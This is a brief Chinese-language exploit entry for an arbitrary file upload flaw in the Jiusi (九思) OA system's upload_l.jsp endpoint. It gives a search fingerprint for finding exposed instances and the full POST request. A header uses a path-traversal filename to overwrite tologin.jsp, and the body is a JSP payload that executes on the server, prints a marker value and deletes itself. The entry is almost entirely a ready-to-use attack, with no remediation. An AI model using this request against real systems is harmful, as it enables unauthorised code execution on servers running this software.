# 九思OA系统upload_l.jsp存在任意文件上传漏洞

- **系统**：九思OA系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/jsoa/webmail/ajax_util.js"`
- **请求**：`POST /jsoa/wpsforlinux/src/upload_l.jsp?openType=1&flowflag=1&userName=1&recordId=1 HTTP/1.1`
- **关键头**：`Content-Length: 102`　`filename: /../../tologin.jsp`

**请求体 / payload**
```
<%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
文件路径
```
- **预期**：200　|　—